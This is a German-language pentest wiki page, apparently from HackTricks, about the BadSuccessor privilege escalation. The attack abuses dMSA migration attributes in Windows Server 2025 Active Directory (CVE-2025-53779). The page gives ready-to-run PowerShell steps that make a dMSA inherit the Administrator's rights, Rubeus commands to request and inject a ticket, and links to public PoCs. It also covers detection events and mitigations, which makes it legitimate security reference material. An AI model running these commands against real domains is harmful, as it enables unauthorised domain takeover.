# BadSuccessor: Privilege Escalation durch den Missbrauch der Delegated-MSA-Migration

{{#include ../../banners/hacktricks-training.md}}

## Überblick

Delegated Managed Service Accounts (**dMSA**) sind der Nachfolger der **gMSA**-Konten der nächsten Generation, die mit Windows Server 2025 eingeführt wurden. Ein legitimer Migrationsworkflow ermöglicht es Administratoren, ein *altes* Konto (Benutzer-, Computer- oder Servicekonto) durch ein dMSA zu ersetzen und dabei Berechtigungen transparent beizubehalten. Der Workflow wird über PowerShell-Cmdlets wie `Start-ADServiceAccountMigration` und `Complete-ADServiceAccountMigration` bereitgestellt und basiert auf zwei LDAP-Attributen des **dMSA-Objekts**:

* **`msDS-ManagedAccountPrecededByLink`** – *DN link* zum ersetzten (alten) Konto.
* **`msDS-DelegatedMSAState`**       – Migrationsstatus (`0` = keiner, `1` = in Bearbeitung, `2` = *abgeschlossen*).<sup>[[1]](#references)</sup>

Wenn ein Angreifer innerhalb einer OU ein beliebiges dMSA erstellen und diese beiden Attribute direkt manipulieren kann, behandeln LSASS und der KDC das dMSA als *Nachfolger* des verknüpften Kontos. Wenn sich der Angreifer anschließend als das dMSA authentifiziert, **erbt er alle Berechtigungen des verknüpften Kontos** – bis hin zu **Domain Admin**, wenn das Administrator-Konto verknüpft ist.<sup>[[1]](#references)</sup>

Diese Technik wurde 2025 von Unit 42 als **BadSuccessor** bezeichnet. Microsoft vergab später die Bezeichnung **CVE-2025-53779** und veröffentlichte im **August 2025** ein Sicherheitsupdate. Die Technik bleibt für ungepatchte Windows-Server-2025-Umgebungen sowie für die Überprüfung gefährlicher OU-Delegierungen relevant.<sup>[[1]](#references)[[2]](#references)[[6]](#references)</sup>

### Voraussetzungen für den Angriff

1. Ein Konto, das *berechtigt* ist, Objekte innerhalb **einer Organizational Unit (OU)** zu erstellen, und mindestens eine der folgenden Berechtigungen besitzt:
* `Create Child` → **`msDS-DelegatedManagedServiceAccount`**-Objektklasse
* `Create Child` → **`All Objects`** (generisches Erstellen)
2. Netzwerkverbindung zu LDAP und Kerberos (übliches Szenario mit Domänenbeitritt / Remote-Angriff).<sup>[[1]](#references)</sup>

## Aufzählung verwundbarer OUs

Unit 42 hat ein PowerShell-Hilfsskript veröffentlicht, das die Sicherheitsdeskriptoren jeder OU analysiert und die erforderlichen ACEs hervorhebt:<sup>[[1]](#references)</sup>
```powershell
Get-BadSuccessorOUPermissions.ps1 -Domain contoso.local
```
Im Hintergrund führt das Script eine seitenweise LDAP-Suche nach `(objectClass=organizationalUnit)` aus und prüft jedes `nTSecurityDescriptor` auf

* `ADS_RIGHT_DS_CREATE_CHILD` (0x0001)
* Active Directory Schema ID: 31ed51fa-77b1-4175-884a-5c6f3f6f34e8 (Objektklasse *msDS-DelegatedManagedServiceAccount*)

## Exploitation Steps

Sobald eine beschreibbare OU identifiziert wurde, ist der Angriff nur noch 3 LDAP-Schreibvorgänge entfernt:<sup>[[1]](#references)</sup>
```powershell
# 1. Create a new delegated MSA inside the delegated OU
New-ADServiceAccount -Name attacker_dMSA \
-DNSHostName host.contoso.local \
-Path "OU=DelegatedOU,DC=contoso,DC=com"

# 2. Point the dMSA to the target account (e.g. Domain Admin)
Set-ADServiceAccount attacker_dMSA -Add \
@{msDS-ManagedAccountPrecededByLink="CN=Administrator,CN=Users,DC=contoso,DC=com"}

# 3. Mark the migration as *completed*
Set-ADServiceAccount attacker_dMSA -Replace @{msDS-DelegatedMSAState=2}
```
Nach der Replikation kann sich der Angreifer einfach als `attacker_dMSA$` **logon** oder ein Kerberos-TGT anfordern – Windows erstellt den Token des *ersetzten* Kontos.<sup>[[1]](#references)</sup>

### Automatisierung

Mehrere öffentliche PoCs kapseln den gesamten Workflow einschließlich des Abrufens von Passwörtern und der Ticketverwaltung:

* SharpSuccessor (C#) – [https://github.com/logangoins/SharpSuccessor](https://github.com/logangoins/SharpSuccessor)<sup>[[3]](#references)</sup>
* BadSuccessor.ps1 (PowerShell) – [https://github.com/LuemmelSec/Pentest-Tools-Collection/blob/main/tools/ActiveDirectory/BadSuccessor.ps1](https://github.com/LuemmelSec/Pentest-Tools-Collection/blob/main/tools/ActiveDirectory/BadSuccessor.ps1)<sup>[[4]](#references)</sup>
* NetExec-Modul – `badsuccessor` (Python) – [https://github.com/Pennyw0rth/NetExec](https://github.com/Pennyw0rth/NetExec)<sup>[[5]](#references)</sup>

### Post-Exploitation
```powershell
# Request a TGT for the dMSA and inject it (Rubeus)
Rubeus asktgt /user:attacker_dMSA$ /password:<ClearTextPwd> /domain:contoso.local
Rubeus ptt /ticket:<Base64TGT>

# Access Domain Admin resources
dir \\DC01\C$
```
## Erkennung & Hunting

Aktivieren Sie **Object Auditing** auf OUs und überwachen Sie die folgenden Windows Security Events:<sup>[[1]](#references)[[2]](#references)</sup>

* **5137** – Erstellung des **dMSA**-Objekts
* **5136** – Änderung von **`msDS-ManagedAccountPrecededByLink`**
* **4662** – Änderungen bestimmter Attribute
* GUID `2f5c138a-bd38-4016-88b4-0ec87cbb4919` → `msDS-DelegatedMSAState`
* GUID `a0945b2b-57a2-43bd-b327-4d112a4e8bd1` → `msDS-ManagedAccountPrecededByLink`
* **2946** – Ausstellung eines TGT für den dMSA

Die Korrelation von `4662` (Attributänderung), `4741` (Erstellung eines Computer-/Service-Accounts) und `4624` (nachfolgende Anmeldung) macht BadSuccessor-Aktivitäten schnell sichtbar. XDR-Lösungen wie **XSIAM** werden mit einsatzbereiten Abfragen ausgeliefert (siehe Referenzen).<sup>[[2]](#references)</sup>

## Maßnahmen zur Risikominderung

* Wenden Sie Microsofts Sicherheitsupdate für **CVE-2025-53779** an und überprüfen Sie den Patchstand jedes Windows Server 2025-Domänencontrollers.<sup>[[6]](#references)</sup>
* Wenden Sie das Prinzip der **geringsten Rechte** an – delegieren Sie die Verwaltung von *Service Accounts* nur an vertrauenswürdige Rollen.
* Entfernen Sie `Create Child` / `msDS-DelegatedManagedServiceAccount` aus OUs, die dies nicht ausdrücklich benötigen.
* Überwachen Sie die oben aufgeführten Event-IDs und lösen Sie einen Alarm aus, wenn Identitäten außerhalb von *Tier 0* dMSAs erstellen oder bearbeiten.

## Siehe auch


{{#ref}}
golden-dmsa-gmsa.md
{{#endref}}

## References

- [1] [BadSuccessor: Missbrauch von dMSA zur Rechteausweitung in Active Directory – Akamai](https://www.akamai.com/blog/security-research/abusing-dmsa-for-privilege-escalation-in-active-directory)
- [2] [Unit42 – Wenn gute Accounts schlecht werden: Ausnutzung delegierter verwalteter Service Accounts](https://unit42.paloaltonetworks.com/badsuccessor-attack-vector/)
- [3] [SharpSuccessor PoC](https://github.com/logangoins/SharpSuccessor)
- [4] [BadSuccessor.ps1 – Pentest-Tools-Collection](https://github.com/LuemmelSec/Pentest-Tools-Collection/blob/main/tools/ActiveDirectory/BadSuccessor.ps1)
- [5] [NetExec BadSuccessor module](https://github.com/Pennyw0rth/NetExec/blob/main/nxc/modules/badsuccessor.py)
- [6] [Microsoft Security Response Center – CVE-2025-53779](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-53779)
{{#include ../../banners/hacktricks-training.md}}
